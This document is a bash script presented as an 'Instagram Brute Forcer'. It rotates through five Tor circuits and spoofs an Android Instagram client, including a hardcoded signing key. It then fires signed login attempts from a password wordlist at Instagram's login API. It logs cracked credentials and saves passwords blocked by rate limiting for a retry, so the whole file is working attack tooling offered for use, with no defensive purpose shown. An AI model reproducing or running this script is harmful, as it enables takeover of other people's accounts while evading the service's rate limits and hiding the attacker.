#!/bin/bash
# Coded by: thelinuxchoice (Don't change, noob!)
# Maintained by: Intabih

[ "$(id -u)" != 0 ] && printf "\e[1;77mPlease, run this program as root!\n\e[0m" && exit 1

trap 'store; exit 1;' SIGINT

missing_packages=()
for cmd in tor curl openssl; do
    command -v "$cmd" > /dev/null 2>&1 || { 
        printf "\e[1;91m%s required but it's not installed.\e[0m\n" "$cmd"
        missing_packages+=("$cmd")
    }
done

[ ${#missing_packages[@]} -gt 0 ] && {
    printf "\e[1;91mInstalling missing packages: %s\e[0m\n" "${missing_packages[*]}"
    apt update > /dev/null &&
    apt install -y "${missing_packages[@]}" > /dev/null || {
        printf "\e[1;91mFailed to install required packages. Aborting.\e[0m\n"
        exit 1
    }
}

printf "\e[1;95m  _              _            \e[0m\e[1;91m_____                                  \e[0m\n"
printf "\e[1;95m (_) _ __   ___ | |_   __ _   \e[0m\e[1;91m\_   \ _ __   ___   __ _  _ __    ___  \e[0m\n"
printf "\e[1;95m | || '_ \ / __|| __| / _\` |   \e[0m\e[1;91m/ /\/| '_ \ / __| / _\` || '_ \  / _ \ \e[0m\n"
printf "\e[1;95m | || | | |\__ \| |_ | (_| |\e[0m\e[1;91m/\/ /_  | | | |\__ \| (_| || | | ||  __/ \e[0m\n"
printf "\e[1;77m |_||_| |_||___/ \__| \__,_|\e[0m\e[1;77m\____/  |_| |_||___/ \__,_||_| |_| \___| (v1.1)\e[0m\n"
printf "\n"
printf "\e[1;77m\e[41m Instagram Brute Forcer, Author: @thelinuxchoice (Github/IG) (Forked by: Intabih) \e[0m\n"
printf "\n"


string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32 | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
header="Connection: close, Accept: */*, Content-type: application/x-www-form-urlencoded; charset=UTF-8, Cookie2: \$Version=1, Accept-Language: en-US, User-Agent: Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"

var0=$(curl --socks5 localhost:9051 -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null &) && wait
var2=$(echo "$var0" | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)

read -p $'\e[1;92mUsername account: \e[0m' user

checkaccount=$(curl -L -s https://instagram.com/$user/ | grep -ci "the page may have been removed") & wait
[ "$checkaccount" = 1 ] && printf "\e[1;91mInvalid Username! Try again\e[0m\n" && exit 1

default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-$default_wl_pass}"
default_threads="100"
threads="${threads:-$default_threads}"

[ ! -e /dev/urandom ] && { printf "\e[1;91m/dev/urandom not found!\e[0m\n"; exit 1; }

mkdir -p multitor
for i in {1..5}; do
    printf "SOCKSPort 905$i\nDataDirectory /var/lib/tor$i" > "multitor/multitor$i"
    tor -f "multitor/multitor$i" > /dev/null &
    printf "\e[1;92m[*] Starting Tor connection on port\e[0m\e[1;77m 905$i\e[0m..."
    (curl --socks5-hostname localhost:905$i -s https://www.google.com > /dev/null && printf "\e[1;92mOK!\e[0m\n") || {
        printf "\e[1;91mFAILED!\e[0m\n"
        exit 1
    }
done
wait

printf "\e[1;77m[*] Starting...\e[0m\n"
printf "\e[1;91m [*] Press Ctrl + C to Stop/Save session\e[0m\n"

store() {
    [ -n "$threads" ] && printf "\n\e[1;91m [*] Waiting threads shutting down...\n\e[0m" && wait
    [ -e nottested.lst ] && {
        local not
        not=$(wc -l < nottested.lst)
        printf "\e[1;92m [!] Passwords not tested due IP Blocking:\e[0m\e[1;77m %s\e[0m\n" "$not"
        local ssfile
        ssfile="nottested.$user.$RANDOM"
        mv nottested.lst "$ssfile"
        printf "\e[1;92m [*] Saved:\e[0m\e[1;77m %s\n" "$ssfile"
        rm -rf nottested.lst
        printf "\e[1;91m [!] Use this file as wordlist!\e[0m\n"
    }

    local default_session
    default_session="Y"
    printf "\n\e[1;77m [?] Save session for user\e[0m\e[1;92m %s\? \e[0m" "$user"
    read -p $'\e[1;77m[Y/n]: \e[0m' session
    [[ "$session" != [nN] ]] && {
        session="${session:-$default_session}"
        mkdir -p sessions
        local countpass
        countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
        printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" "$user" "$pass" "$wl_pass" "$countpass" > "sessions/store.session.$user.$(date +"%FT%H%M")"
        printf "\e[1;77mSession saved.\e[0m\n"
        printf "\e[1;92mUse ./instainsane.sh --resume\n"
        exit 1
    }
}

startline=1
endline=20
turn=20

while [ $startline -le $(wc -l < "$wl_pass") ]; do
    IFS=$'\n'
    for pass in $(sed -n "${startline},${endline}p" "$wl_pass"); do
        data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
        ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$ig_sig" | cut -d " " -f2)

        printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$(wc -l < "$wl_pass")" "$pass"

        {
            trap '' SIGINT
            var=$(curl --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$header" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
            case "$var" in
                "challenge")
                    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
                    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
                    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
                    rm -rf nottested.lst
                    kill -1 $$ > /dev/null 2>&1
                    ;;
                "logged_in_user")
                    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
                    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
                    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
                    rm -rf nottested.lst
                    kill -1 $$ > /dev/null 2>&1
                    ;;
                "Please wait" | "")
                    echo "$pass" >> nottested.lst
                    ;;
            esac
        } &
    done
    startline=$((startline + turn))
    endline=$((endline + turn))
    wait
done
exit 1